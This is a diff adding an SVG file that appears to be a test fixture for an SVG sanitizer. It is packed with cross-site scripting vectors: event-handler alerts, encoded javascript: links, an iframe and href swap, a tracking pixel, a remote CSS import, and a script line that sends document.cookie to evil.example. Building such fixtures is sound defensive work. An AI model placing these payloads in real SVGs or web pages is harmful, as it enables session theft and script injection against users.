@@ -1,0 +1,14 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" onload="alert(1)">
+  <script type="text/javascript"><![CDATA[ fetch('https://evil.example/?c=' + document.cookie) ]]></script>
+  <a xlink:href="javascript:alert(2)"><rect width="50" height="50" fill="red" onclick="alert(3)"/></a>
+  <a href="&#106;avascript&#58;alert(4)"><circle cx="75" cy="75" r="20" ONMOUSEOVER="alert(5)"/></a>
+  <a href="https://example.com/"><text x="10" y="90">ok link</text></a>
+  <foreignObject width="100" height="100"><div xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(6)"/></div></foreignObject>
+  <set attributeName="href" to="javascript:alert(7)" begin="0s"/>
+  <animate attributeName="opacity" from="0" to="1" dur="1s"/>
+  <image href="https://tracker.example/pixel.png" width="1" height="1"/>
+  <image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>
+  <use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="/>
+  <style>@import url("https://evil.example/x.css"); rect { fill: blue }</style>
+</svg>
